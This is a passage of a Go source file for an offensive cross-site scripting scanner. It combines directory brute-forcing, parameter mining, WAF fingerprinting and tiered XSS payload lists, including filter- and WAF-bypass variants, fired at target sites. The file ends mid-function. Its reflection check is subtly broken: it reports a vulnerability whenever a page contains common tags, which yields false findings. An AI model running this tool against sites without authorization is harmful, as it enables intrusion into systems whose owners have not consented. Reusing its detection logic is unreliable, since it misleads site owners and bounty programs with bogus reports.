package main

// =============================================================================
//  Assault-XSS v1.0 — Advanced XSS Bug Bounty Scanner
//  Language : Go 1.21+  |  Zero external dependencies
//  Run      : go run xss.go -u https://target.com -s target.com
//  Build    : go build -o xsshunter xss.go && ./xsshunter -u ...
//  For      : Authorized Bug Bounty / Ethical Pentesting ONLY
// =============================================================================

import (
	"bytes"
	"context"
	"crypto/md5"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"html"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ─────────────────────────────────────────────────────────────────────────────
// ANSI — zero deps
// ─────────────────────────────────────────────────────────────────────────────
const (
	RST = "\033[0m"
	BLD = "\033[1m"
	DIM = "\033[2m"
	ITL = "\033[3m"

	fBLK = "\033[30m"
	fRED = "\033[31m"
	fGRN = "\033[32m"
	fYLW = "\033[33m"
	fBLU = "\033[34m"
	fMAG = "\033[35m"
	fCYN = "\033[36m"
	fWHT = "\033[97m"
	fGRY = "\033[90m"

	bRED = "\033[41m"
	bGRN = "\033[42m"
	bYLW = "\033[43m"
	bBLU = "\033[44m"
	bMAG = "\033[45m"
	bCYN = "\033[46m"

	mvUp   = "\033[1A"
	clrLn  = "\033[2K"
	hidCur = "\033[?25l"
	shwCur = "\033[?25h"
	savCur = "\033[s"
	rsCur  = "\033[u"
)

func red(s string) string  { return fRED + s + RST }
func grn(s string) string  { return fGRN + s + RST }
func ylw(s string) string  { return fYLW + s + RST }
func cyn(s string) string  { return fCYN + s + RST }
func mag(s string) string  { return fMAG + s + RST }
func wht(s string) string  { return fWHT + s + RST }
func gry(s string) string  { return fGRY + s + RST }
func bld(s string) string  { return BLD + s + RST }
func dim(s string) string  { return DIM + s + RST }
func bred(s string) string { return bRED + fBLK + BLD + s + RST }
func bgrn(s string) string { return bGRN + fBLK + BLD + s + RST }
func bylw(s string) string { return bYLW + fBLK + BLD + s + RST }
func bcyn(s string) string { return bCYN + fBLK + BLD + s + RST }
func bmag(s string) string { return bMAG + fBLK + BLD + s + RST }

// ─────────────────────────────────────────────────────────────────────────────
// BOX DRAWING
// ─────────────────────────────────────────────────────────────────────────────
const W = 68

func boxTop(color string) string {
	return color + "╔" + strings.Repeat("═", W) + "╗" + RST
}
func boxBot(color string) string {
	return color + "╚" + strings.Repeat("═", W) + "╝" + RST
}
func boxMid(color string) string {
	return color + "╠" + strings.Repeat("═", W) + "╣" + RST
}
func boxLine(color, content string) string {
	stripped := stripANSI(content)
	pad      := W - len(stripped)
	if pad < 0 {
		pad = 0
	}
	return color + "║" + RST + " " + content + strings.Repeat(" ", pad-1) + color + "║" + RST
}
func boxEmpty(color string) string {
	return color + "║" + strings.Repeat(" ", W) + "║" + RST
}
func thinLine(color string) string {
	return color + "─" + strings.Repeat("─", W) + RST
}

var ansiRe = regexp.MustCompile(`\033\[[0-9;]*[mABCDEFGHJKSTfnsulh]`)

func stripANSI(s string) string {
	return ansiRe.ReplaceAllString(s, "")
}

// ─────────────────────────────────────────────────────────────────────────────
// SPINNER
// ─────────────────────────────────────────────────────────────────────────────
type Spinner struct {
	mu      sync.Mutex
	frames  []string
	idx     int
	label   string
	running bool
	done    chan struct{}
	color   string
}

func NewSpinner(label, color string) *Spinner {
	return &Spinner{
		frames: []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"},
		label:  label,
		color:  color,
		done:   make(chan struct{}),
	}
}

func (s *Spinner) Start() {
	s.running = true
	fmt.Print(hidCur)
	go func() {
		for {
			select {
			case <-s.done:
				return
			default:
				s.mu.Lock()
				frame := s.frames[s.idx%len(s.frames)]
				lbl   := s.label
				col   := s.color
				s.idx++
				s.mu.Unlock()
				fmt.Printf("\r  %s%s%s %s   ", col, frame, RST, lbl)
				time.Sleep(80 * time.Millisecond)
			}
		}
	}()
}

func (s *Spinner) Update(label string) {
	s.mu.Lock()
	s.label = label
	s.mu.Unlock()
}

func (s *Spinner) Stop(finalMsg string) {
	if !s.running {
		return
	}
	s.running = false
	s.done <- struct{}{}
	fmt.Printf("\r%s\r", strings.Repeat(" ", W+10))
	if finalMsg != "" {
		fmt.Println(finalMsg)
	}
	fmt.Print(shwCur)
}

// ─────────────────────────────────────────────────────────────────────────────
// PROGRESS BAR
// ─────────────────────────────────────────────────────────────────────────────
type ProgressBar struct {
	mu      sync.Mutex
	total   int
	current int64
	label   string
	color   string
	width   int
}

func NewProgressBar(total int, label, color string) *ProgressBar {
	fmt.Print(hidCur)
	return &ProgressBar{total: total, label: label, color: color, width: 35}
}

func (p *ProgressBar) Inc(label string) {
	n := int(atomic.AddInt64((*int64)(&p.current), 1))
	p.mu.Lock()
	if label != "" {
		p.label = label
	}
	lbl := p.label
	p.mu.Unlock()

	if n%10 != 0 && n != p.total {
		return
	}

	pct    := float64(n) / float64(p.total) * 100
	filled := int(float64(n) / float64(p.total) * float64(p.width))
	empty  := p.width - filled

	bar := p.color + strings.Repeat("█", filled) + fGRY + strings.Repeat("░", empty) + RST
	eta := ""

	fmt.Printf("\r  %s[%s%s%s]%s %s%.1f%%%s  %s%d%s/%s%d%s  %s%s%s   ",
		fGRY, RST,
		bar,
		fGRY, RST,
		BLD+fCYN, pct, RST,
		fGRN, n, RST,
		fGRY, p.total, RST,
		DIM+fGRY, lbl+eta, RST,
	)

	if n >= p.total {
		fmt.Println()
		fmt.Print(shwCur)
	}
}

func (p *ProgressBar) Done() {
	total := p.total
	p.Inc("")
	_ = total
	fmt.Print(shwCur)
}

// ─────────────────────────────────────────────────────────────────────────────
// LOGGER  (thread-safe, rich output)
// ─────────────────────────────────────────────────────────────────────────────
type Logger struct {
	mu      sync.Mutex
	verbose bool
}

func (l *Logger) raw(msg string) {
	l.mu.Lock()
	fmt.Println(msg)
	l.mu.Unlock()
}

func (l *Logger) Info(msg string)    { l.raw("  " + fCYN + " ◆ " + RST + msg) }
func (l *Logger) Success(msg string) { l.raw("  " + fGRN + " ✔ " + RST + BLD + msg + RST) }
func (l *Logger) Warn(msg string)    { l.raw("  " + fYLW + " ⚠ " + RST + msg) }
func (l *Logger) Error(msg string)   { l.raw("  " + fRED + " ✖ " + RST + msg) }
func (l *Logger) Debug(msg string) {
	if l.verbose {
		l.raw("  " + fGRY + " · " + RST + dim(msg))
	}
}

func (l *Logger) Phase(n int, name string) {
	icons := []string{"", "🔍", "⛏", "💉", "📄"}
	icon  := "◈"
	if n < len(icons) {
		icon = icons[n]
	}
	l.raw("")
	l.raw(boxTop(fYLW))
	l.raw(boxLine(fYLW, fmt.Sprintf("%s%s PHASE %d%s  %s%s%s",
		BLD+fYLW, icon, n, RST, BLD+fWHT, name, RST)))
	l.raw(boxBot(fYLW))
	l.raw("")
}

func (l *Logger) DirFound(status int, u, title string, size int, techs []string) {
	var badge, urlCol string
	switch {
	case status == 200:
		badge  = " " + bgrn(" OPEN ") + " "
		urlCol = BLD + fGRN + u + RST
	case status == 301 || status == 302 || status == 307 || status == 308:
		badge  = " " + bcyn(" REDIR") + " "
		urlCol = fCYN + u + RST
	case status == 403:
		badge  = " " + bylw(" FORBID") + " "
		urlCol = fYLW + u + RST
	case status == 401:
		badge  = " " + bylw(" AUTH  ") + " "
		urlCol = fYLW + u + RST
	case status == 405:
		badge  = " " + bmag(" METH  ") + " "
		urlCol = fMAG + u + RST
	default:
		badge  = " " + gry(fmt.Sprintf(" %d   ", status)) + " "
		urlCol = fGRY + u + RST
	}
	techStr := ""
	if len(techs) > 0 {
		techStr = dim("  [" + strings.Join(techs, "·") + "]")
	}
	titleStr := ""
	if title != "" {
		titleStr = gry("  " + title)
	}
	szStr := fmt.Sprintf(" %s%s%s", fGRY, humanSize(size), RST)
	l.raw(fmt.Sprintf("  %s%s %s%s%s%s", badge, szStr, urlCol, titleStr, techStr, RST))
}

func (l *Logger) Finding(sev, method, u, param, level, payload, evidence string) {
	l.raw("")
	l.raw(boxTop(fMAG))
	l.raw(boxLine(fMAG, BLD+fMAG+"  ⚡ XSS VULNERABILITY FOUND"+RST))
	l.raw(boxMid(fMAG))
	l.raw(boxLine(fMAG, fmt.Sprintf("  Severity  %s", severityBadge(sev))))
	l.raw(boxLine(fMAG, fmt.Sprintf("  Method    %s", bld(method))))
	l.raw(boxLine(fMAG, fmt.Sprintf("  URL       %s", cyn(truncate(u, 55)))))
	l.raw(boxLine(fMAG, fmt.Sprintf("  Param     %s", grn(param))))
	l.raw(boxLine(fMAG, fmt.Sprintf("  Level     %s", mag(level))))
	l.raw(boxLine(fMAG, fmt.Sprintf("  Payload   %s", ylw(truncate(payload, 52)))))
	l.raw(boxLine(fMAG, fmt.Sprintf("  Evidence  %s", dim(truncate(evidence, 52)))))
	l.raw(boxBot(fMAG))
	l.raw("")
}

func severityBadge(s string) string {
	switch s {
	case "Critical":
		return bred("  CRITICAL  ")
	case "High":
		return bylw("  HIGH      ")
	case "Medium":
		return bcyn("  MEDIUM    ")
	default:
		return "  " + s
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// PAYLOADS
// ─────────────────────────────────────────────────────────────────────────────
var payloadMap = map[string][]string{
	"level1_basic": {
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`"<script>alert(1)</script>`,
		`'<script>alert(1)</script>`,
		`<ScRiPt>alert(1)</ScRiPt>`,
		`<body onload=alert(1)>`,
		`<iframe src=javascript:alert(1)>`,
	},
	"level2_attribute": {
		`" onmouseover="alert(1)`,
		`' onmouseover='alert(1)`,
		`" autofocus onfocus="alert(1)`,
		`"><img src=x onerror=alert(1)>`,
		`'><img src=x onerror=alert(1)>`,
		`" onclick="alert(1)`,
		`javascript:alert(1)`,
		`" onblur="alert(1)" autofocus="`,
	},
	"level3_encoded": {
		`%3Cscript%3Ealert(1)%3C/script%3E`,
		`%22%3E%3Cscript%3Ealert(1)%3C/script%3E`,
		`&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
		`&#60;script&#62;alert(1)&#60;/script&#62;`,
		`\u003cscript\u003ealert(1)\u003c/script\u003e`,
		`%253Cscript%253Ealert(1)%253C/script%253E`,
		`%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`,
	},
	"level4_dom": {
		`#<script>alert(1)</script>`,
		`#"><img src=x onerror=alert(1)>`,
		`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
		`<details open ontoggle=alert(1)>`,
		`<video><source onerror=alert(1)>`,
		`<audio src=x onerror=alert(1)>`,
		`<object data=javascript:alert(1)>`,
	},
	"level5_filter_bypass": {
		`<svg/onload=eval(atob('YWxlcnQoMSk='))>`,
		`<img src=1 onerror='ale'+'rt(1)'>`,
		`<script>window['ale'+'rt'](1)</script>`,
		`<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`,
		`<input onfocus=alert(1) autofocus>`,
		`<select onfocus=alert(1) autofocus>`,
		`<marquee onstart=alert(1)>`,
	},
	"level6_waf_bypass": {
		`<Svg/onload=alert(1)>`,
		`<iMg src=x onerror=alert(1)>`,
		"<script>alert`1`</script>",
		`<script>{alert(1)}</script>`,
		`</script><script>alert(1)</script>`,
		`<svg id=alert(1) onload=eval(id)>`,
		`'-alert(1)-'`,
		`"-alert(1)-"`,
		`<script>/*xss*/alert(1)/*end*/</script>`,
	},
}

var wordlist = []string{
	"admin","login","dashboard","api","v1","v2","v3","v4",
	"search","user","users","profile","account","settings",
	"register","signup","signin","logout","auth","oauth",
	"forgot","reset","password","contact","about","help",
	"support","faq","news","blog","shop","cart","checkout",
	"product","products","category","categories","tag","tags",
	"feed","rss","upload","file","files","download","downloads",
	"img","image","images","static","assets","media","public",
	"config","wp-admin","wp-login.php","administrator","manage",
	"panel","cpanel","phpmyadmin","phpinfo.php","info.php",
	"index.php","home","main","test","debug","dev","staging",
	"api/v1","api/v2","api/v3","api/user","api/users","api/search",
	"api/login","api/register","api/auth","api/profile","api/me",
	"api/data","api/config","api/admin","api/token",
	"graphql","gql","rest","ajax","xhr",
	"comment","comments","post","posts","reply","replies",
	"redirect","r","go","out","track","click",
	"edit","delete","create","update","view","list",
	"export","import","backup","report","reports",
	"analytics","stats","metrics","invoice","payment",
	"notification","notifications","message","messages",
	"subscribe","newsletter","promo",
	".git",".env",".htaccess","robots.txt","sitemap.xml",
	"swagger","swagger-ui","swagger.json","openapi.json","api-docs",
	"health","status","ping","version",
	"internal","private","external","global",
	"console","terminal","shell","exec",
	"hook","hooks","webhook","webhooks","callback",
	"verify","verification","confirm","activate",
	"2fa","mfa","otp","invite","invites",
}

var commonParams = []string{
	"q","s","search","query","keyword","term","find","text",
	"id","uid","user_id","userId","account_id",
	"page","p","pg","offset","limit","per_page","size",
	"name","username","email","title","content","body","msg",
	"url","link","href","src","path","file","filename",
	"redirect","return","next","back","goto","r","ref",
	"callback","cb","jsonp","format","type","mode","view",
	"lang","language","locale","country","region",
	"sort","order","orderby","filter","category","cat","tag",
	"action","cmd","command","method","op","func",
	"token","key","api_key","access_token",
	"message","error","info","notice","alert","status","code",
	"from","to","subject","data","input","value","param",
	"date","start","end","time",
	"output","result","results",
	"target","dest","destination","origin","source",
	"debug","test","dev","preview",
	"include","exclude","fields","expand",
	"coupon","promo","discount",
}

// ─────────────────────────────────────────────────────────────────────────────
// SCOPE
// ─────────────────────────────────────────────────────────────────────────────
type ScopeChecker struct{ domains []string }

func NewScope(raw string) *ScopeChecker {
	parts := strings.Split(raw, ",")
	domains := make([]string, 0)
	for _, p := range parts {
		d := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(p), "*."))
		if d != "" {
			domains = append(domains, d)
		}
	}
	return &ScopeChecker{domains: domains}
}

func (sc *ScopeChecker) InScope(rawURL string) bool {
	u, err := url.Parse(rawURL)
	if err != nil {
		return false
	}
	host := strings.ToLower(strings.Split(u.Hostname(), ":")[0])
	for _, d := range sc.domains {
		if host == d || strings.HasSuffix(host, "."+d) {
			return true
		}
	}
	return false
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP CLIENT
// ─────────────────────────────────────────────────────────────────────────────
func newClient(timeoutSec int) *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        500,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     30 * time.Second,
			DialContext: (&net.Dialer{
				Timeout:   time.Duration(timeoutSec) * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		},
		Timeout: time.Duration(timeoutSec) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func doGet(client *http.Client, rawURL string, hdrs map[string]string) (int, []byte, http.Header, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return 0, nil, nil, err
	}
	req.Header.Set("User-Agent", "XSSHunter-BB/3.0 (+BugBounty)")
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, nil, nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, body, resp.Header, nil
}

func doPost(client *http.Client, rawURL string, data url.Values, hdrs map[string]string) (int, []byte, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(data.Encode()))
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "XSSHunter-BB/3.0 (+BugBounty)")
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, body, nil
}

// ─────────────────────────────────────────────────────────────────────────────
// FINGERPRINTER
// ─────────────────────────────────────────────────────────────────────────────
var techSigs = map[string][]string{
	"WordPress": {"wp-content","wp-includes","WordPress"},
	"Laravel":   {"laravel_session","Laravel"},
	"Django":    {"csrfmiddlewaretoken","Django"},
	"Rails":     {"_rails_session","Ruby on Rails"},
	"Express":   {"X-Powered-By: Express"},
	"Spring":    {"JSESSIONID","Spring"},
	"ASP.NET":   {"ASP.NET","__VIEWSTATE"},
	"PHP":       {"PHPSESSID","X-Powered-By: PHP"},
	"Nginx":     {"Server: nginx"},
	"Apache":    {"Server: Apache"},
	"Cloudflare":{"cf-ray","cloudflare"},
	"Next.js":   {"__NEXT_DATA__","_next/static"},
	"React":     {"data-reactroot","react-root"},
	"Angular":   {"ng-version","ng-app"},
	"Vue":       {"__vue__","data-v-"},
	"GraphQL":   {`"data":`,`"errors":`, "graphql"},
}

var wafSigs = map[string][]string{
	"Cloudflare":  {"cloudflare","cf-ray","__cfduid"},
	"Akamai":      {"akamai","x-check-cacheable"},
	"Sucuri":      {"x-sucuri-id","sucuri"},
	"ModSecurity": {"mod_security","modsecurity"},
	"AWS WAF":     {"x-amzn-requestid","awswaf"},
	"Imperva":     {"x-iinfo","incapsula","_incap_ses"},
	"Fortinet":    {"FORTIWAFSID"},
	"Wordfence":   {"wordfence"},
}

func detectTech(headers http.Header, body []byte) []string {
	found := []string{}
	combined := strings.ToLower(headersToStr(headers) + string(body[:min(5000, len(body))]))
	for tech, sigs := range techSigs {
		for _, sig := range sigs {
			if strings.Contains(combined, strings.ToLower(sig)) {
				found = append(found, tech)
				break
			}
		}
	}
	return found
}

func detectWAF(headers http.Header, body []byte, status int) string {
	combined := strings.ToLower(headersToStr(headers) + string(body[:min(2000, len(body))]))
	for waf, sigs := range wafSigs {
		for _, sig := range sigs {
			if strings.Contains(combined, strings.ToLower(sig)) {
				return waf
			}
		}
	}
	if status == 406 || status == 501 {
		return "Unknown WAF"
	}
	return ""
}

func headersToStr(h http.Header) string {
	var b strings.Builder
	for k, v := range h {
		b.WriteString(k + ": " + strings.Join(v, ",") + "\n")
	}
	return b.String()
}

// ─────────────────────────────────────────────────────────────────────────────
// SOFT-404
// ─────────────────────────────────────────────────────────────────────────────
var notFoundPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)404`),
	regexp.MustCompile(`(?i)not found`),
	regexp.MustCompile(`(?i)page not found`),
	regexp.MustCompile(`(?i)doesn.t exist`),
	regexp.MustCompile(`(?i)does not exist`),
	regexp.MustCompile(`(?i)could not be found`),
	regexp.MustCompile(`(?i)nothing here`),
	regexp.MustCompile(`(?i)we couldn.t find`),
	regexp.MustCompile(`(?i)page is missing`),
}

type Soft404 struct {
	mu      sync.RWMutex
	hashes  map[string]string
	lengths map[string]int
}

func NewSoft404() *Soft404 {
	return &Soft404{hashes: map[string]string{}, lengths: map[string]int{}}
}

func (s *Soft404) Calibrate(client *http.Client, base string, log *Logger) {
	probe := fmt.Sprintf("xsshunter_fake_%d", time.Now().UnixNano())
	u     := strings.TrimRight(base, "/") + "/" + probe
	_, body, _, err := doGet(client, u, nil)
	if err != nil {
		return
	}
	norm := regexp.MustCompile(`\d`).ReplaceAll(body[:min(2000, len(body))], []byte("N"))
	h    := fmt.Sprintf("%x", md5.Sum(bytes.ToLower(norm)))
	s.mu.Lock()
	s.hashes[base]  = h
	s.lengths[base] = len(body)
	s.mu.Unlock()
	log.Debug(fmt.Sprintf("Soft404 calibrated  hash=%s  len=%d", h, len(body)))
}

func (s *Soft404) IsReal(body []byte, status int, base string) bool {
	if status != 200 {
		return status == 200 || status == 201 ||
			status == 301 || status == 302 || status == 307 || status == 308 ||
			status == 401 || status == 403 || status == 405
	}
	bodyStr := strings.ToLower(string(body))
	for _, pat := range notFoundPatterns {
		if pat.MatchString(bodyStr) {
			return false
		}
	}
	if len(strings.TrimSpace(string(body))) < 100 {
		return false
	}
	norm := regexp.MustCompile(`\d`).ReplaceAll(body[:min(2000, len(body))], []byte("N"))
	h    := fmt.Sprintf("%x", md5.Sum(bytes.ToLower(norm)))
	s.mu.RLock()
	baseHash := s.hashes[base]
	baseLen  := s.lengths[base]
	s.mu.RUnlock()
	if baseHash != "" && h == baseHash {
		return false
	}
	if baseLen > 0 && abs(len(body)-baseLen) < 50 {
		return false
	}
	return true
}

func extractTitle(body []byte) string {
	re := regexp.MustCompile(`(?i)<title[^>]*>(.*?)</title>`)
	m  := re.FindSubmatch(body)
	if m != nil {
		t := strings.TrimSpace(string(m[1]))
		return truncate(t, 55)
	}
	return ""
}

// ─────────────────────────────────────────────────────────────────────────────
// DATA STRUCTURES
// ─────────────────────────────────────────────────────────────────────────────
type DirResult struct {
	URL           string   `json:"url"`
	Status        int      `json:"status"`
	ContentLength int      `json:"content_length"`
	ContentType   string   `json:"content_type"`
	Title         string   `json:"title"`
	Server        string   `json:"server"`
	IsReal        bool     `json:"is_real"`
	RedirectTo    string   `json:"redirect_to"`
	Technologies  []string `json:"technologies"`
}

type Finding struct {
	URL         string `json:"url"`
	Parameter   string `json:"parameter"`
	Payload     string `json:"payload"`
	Level       string `json:"level"`
	Method      string `json:"method"`
	Evidence    string `json:"evidence"`
	Severity    string `json:"severity"`
	Timestamp   string `json:"timestamp"`
	CWE         string `json:"cwe"`
	CVSS        string `json:"cvss"`
	Remediation string `json:"remediation"`
}

type ScanSession struct {
	Tool         string      `json:"tool"`
	Version      string      `json:"version"`
	Target       string      `json:"target"`
	Scope        []string    `json:"scope"`
	StartTime    string      `json:"start_time"`
	EndTime      string      `json:"end_time"`
	WAFDetected  string      `json:"waf_detected"`
	Technologies []string    `json:"technologies"`
	DirsFound    []DirResult `json:"dirs_found"`
	ParamsFound  []string    `json:"params_found"`
	Findings     []Finding   `json:"findings"`
	URLsTested   int         `json:"urls_tested"`
	PayloadsSent int64       `json:"payloads_sent"`
	RequestsMade int64       `json:"requests_made"`
}

// ─────────────────────────────────────────────────────────────────────────────
// DIR DISCOVERY
// ─────────────────────────────────────────────────────────────────────────────
type DirDiscovery struct {
	client      *http.Client
	scope       *ScopeChecker
	log         *Logger
	soft404     *Soft404
	concurrency int
	visited     sync.Map
	headers     map[string]string
}

func (d *DirDiscovery) probe(base, path string) *DirResult {
	rawURL := strings.TrimRight(base, "/") + "/" + strings.TrimLeft(path, "/")
	if _, loaded := d.visited.LoadOrStore(rawURL, true); loaded {
		return nil
	}
	if !d.scope.InScope(rawURL) {
		return nil
	}
	status, body, headers, err := doGet(d.client, rawURL, d.headers)
	if err != nil {
		d.log.Debug("err " + rawURL + ": " + err.Error())
		return nil
	}
	ctype  := headers.Get("Content-Type")
	server := headers.Get("Server")
	redir  := headers.Get("Location")
	title  := extractTitle(body)
	techs  := detectTech(headers, body)
	isReal := d.soft404.IsReal(body, status, base)

	r := &DirResult{
		URL: rawURL, Status: status, ContentLength: len(body),
		ContentType: truncate(ctype, 40), Title: title, Server: server,
		IsReal: isReal, RedirectTo: redir, Technologies: techs,
	}
	if isReal {
		d.log.DirFound(status, rawURL, title, len(body), techs)
	}
	return r
}

func (d *DirDiscovery) Run(base string, words []string, depth, maxDepth int, log *Logger) []DirResult {
	if depth > maxDepth {
		return nil
	}

	sp := NewSpinner(
		fmt.Sprintf("Calibrating soft-404 baseline for %s", cyn(base)),
		fCYN,
	)
	sp.Start()
	d.soft404.Calibrate(d.client, base, log)
	sp.Stop(fmt.Sprintf("  %s Baseline calibrated for %s", grn("✔"), cyn(base)))

	log.Info(fmt.Sprintf("Probing %s paths  depth %s%d%s/%d",
		bld(strconv.Itoa(len(words))), fCYN, depth, RST, maxDepth))

	pb  := NewProgressBar(len(words), "scanning dirs...", fGRN)
	sem := make(chan struct{}, d.concurrency)
	var mu sync.Mutex
	var wg sync.WaitGroup
	found := []DirResult{}

	for _, w := range words {
		wg.Add(1)
		sem <- struct{}{}
		go func(word string) {
			defer wg.Done()
			defer func() { <-sem }()
			r := d.probe(base, word)
			pb.Inc("scanning dirs...")
			if r != nil && r.IsReal {
				mu.Lock()
				found = append(found, *r)
				mu.Unlock()
			}
		}(w)
	}
	wg.Wait()
	pb.Done()

	if depth < maxDepth {
		for _, r := range found {
			if r.Status == 200 && strings.Contains(r.ContentType, "html") {
				sub := d.Run(r.URL, words[:min(40, len(words))], depth+1, maxDepth, log)
				mu.Lock()
				found = append(found, sub...)
				mu.Unlock()
			}
		}
	}
	return found
}

// ─────────────────────────────────────────────────────────────────────────────
// PARAM MINER
// ─────────────────────────────────────────────────────────────────────────────
type ParamMiner struct {
	client      *http.Client
	scope       *ScopeChecker
	log         *Logger
	concurrency int
	probeVal    string
	headers     map[string]string
}

func (p *ParamMiner) probe(rawURL, param string) string {
	if !p.scope.InScope(rawURL) {
		return ""
	}
	sep := "?"
	if strings.Contains(rawURL, "?") {
		sep = "&"
	}
	_, body, _, err := doGet(p.client, rawURL+sep+param+"="+p.probeVal, p.headers)
	if err != nil {
		return ""
	}
	if strings.Contains(string(body), p.probeVal) {
		return param
	}
	return ""
}

func (p *ParamMiner) Run(rawURL string, params []string) []string {
	pb  := NewProgressBar(len(params), "mining params...", fMAG)
	sem := make(chan struct{}, p.concurrency)
	var mu sync.Mutex
	var wg sync.WaitGroup
	found := []string{}

	for _, param := range params {
		wg.Add(1)
		sem <- struct{}{}
		go func(pr string) {
			defer wg.Done()
			defer func() { <-sem }()
			r := p.probe(rawURL, pr)
			pb.Inc("mining params...")
			if r != "" {
				mu.Lock()
				found = append(found, r)
				mu.Unlock()
				p.log.Success(fmt.Sprintf("Param reflected: %s  on  %s", grn(r), cyn(rawURL)))
			}
		}(param)
	}
	wg.Wait()
	pb.Done()
	return found
}

func extractParamsFromHTML(body []byte, rawURL string) []string {
	params := map[string]bool{}
	for _, re := range []*regexp.Regexp{
		regexp.MustCompile(`name=["']([a-zA-Z_][a-zA-Z0-9_\-]{0,40})["']`),
		regexp.MustCompile(`[?&]([a-zA-Z_][a-zA-Z0-9_\-]{0,30})=`),
		regexp.MustCompile(`"([a-zA-Z_][a-zA-Z0-9_\-]{0,30})":\s*"[^"]{0,100}"`),
	} {
		for _, m := range re.FindAllSubmatch(body, -1) {
			params[string(m[1])] = true
		}
	}
	if u, err := url.Parse(rawURL); err == nil {
		for k := range u.Query() {
			params[k] = true
		}
	}
	out := make([]string, 0, len(params))
	for k := range params {
		out = append(out, k)
	}
	return out
}

// ─────────────────────────────────────────────────────────────────────────────
// XSS SCANNER
// ─────────────────────────────────────────────────────────────────────────────
type XSSScanner struct {
	client      *http.Client
	scope       *ScopeChecker
	log         *Logger
	levels      []string
	concurrency int
	findings    []Finding
	mu          sync.Mutex
	sent        int64
	seen        sync.Map
	headers     map[string]string
}

func (x *XSSScanner) severity(level string) string {
	switch level {
	case "level6_waf_bypass":
		return "Critical"
	case "level4_dom", "level5_filter_bypass":
		return "High"
	default:
		return "Medium"
	}
}

func (x *XSSScanner) isReflected(body []byte, payload string) bool {
	b  := string(body)
	bl := strings.ToLower(b)
	pl := strings.ToLower(payload)
	if strings.Contains(b, payload) || strings.Contains(bl, pl) {
		return true
	}
	if decoded, err := url.QueryUnescape(payload); err == nil && strings.Contains(b, decoded) {
		return true
	}
	dangerous := []string{"onerror=","onload=","onfocus=","<script","javascript:","alert("}
	for _, d := range dangerous {
		if strings.Contains(pl, d) {
			for _, tag := range []string{"<script","<img","<svg","<iframe","onerror","onload"} {
				if strings.Contains(bl, tag) {
					return true
				}
			}
			break
		}
	}
	return false
}

func (x *XSSScanner) evidence(body []byte, payload string) string {
	b   := string(body)
	idx := strings.Index(strings.ToLower(b), strings.ToLower(payload[:min(15, len(payload))]))
	if idx >= 0 {
		s := max(0, idx-80)
		e := min(len(b), idx+len(payload)+80)
		return strings.ReplaceAll(b[s:e], "\n", " ")
	}
	return strings.ReplaceAll(truncate(b, 300), "\n", " ")
}

func (x *XSSScanner) testGET(rawURL, param, level, payload string) *Finding {
	key := fmt.Sprintf("%x", md5.Sum([]byte(rawURL+param+payload+"G")))
	if _, exists := x.seen.LoadOrStore(key, true); exists {
		return nil
	}
	if !x.scope.InScope(rawURL) {
		return nil
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	atomic.AddInt64(&x.sent, 1)
	_, body, _, err := doGet(x.client, u.String(), x.headers)
	if err != nil {
		return nil
	}
	if x.isReflected(body, payload) {
		return &Finding{
			URL: u.String(), Parameter: param, Payload: payload,
			Level: level, Method: "GET",
			Evidence:    truncate(x.evidence(body, payload), 400),
			Severity:    x.severity(level),
			Timestamp:   time.Now().Format(time.RFC3339),
			CWE: "CWE-79", CVSS: "6.1",
			Remediation: "Encode all user-supplied input before rendering in HTML context.",
		}
	}
	return nil
}

func (x *XSSScanner) testPOST(rawURL, param, level, payload string) *Finding {
	key := fmt.Sprintf("%x", md5.Sum([]byte(rawURL+param+payload+"P")))
	if _, exists := x.seen.LoadOrStore(key, true); exists {
		return nil
	}
	if !x.scope.InScope(rawURL) {
		return nil
	}
	data := url.Values{}
	data.Set(param, payload)
	atomic.AddInt64(&x.sent, 1)
	_, body, err := doPost(x.client, rawURL, data, x.headers)
	if err != nil {
		return nil
	}
	if x.isReflected(body, payload) {
		return &Finding{
			URL: rawURL, Parameter: param, Payload: payload,
			Level: level, Method: "POST",
			Evidence:    truncate(x.evidence(body, payload), 400),
			Severity:    x.severity(level),
			Timestamp:   time.Now().Format(time.RFC3339),
			CWE: "CWE-79", CVSS: "6.1",
			Remediation: "Encode all user-supplied input before rendering in HTML context.",
		}
	}
	return nil
}

type scanTask struct{ rawURL, param, level, payload, method string }

func (x *XSSScanner) Scan(rawURL string, params []string) []Finding {
	var tasks []scanTask
	for _, param := range params {
		for _, level := range x.levels {
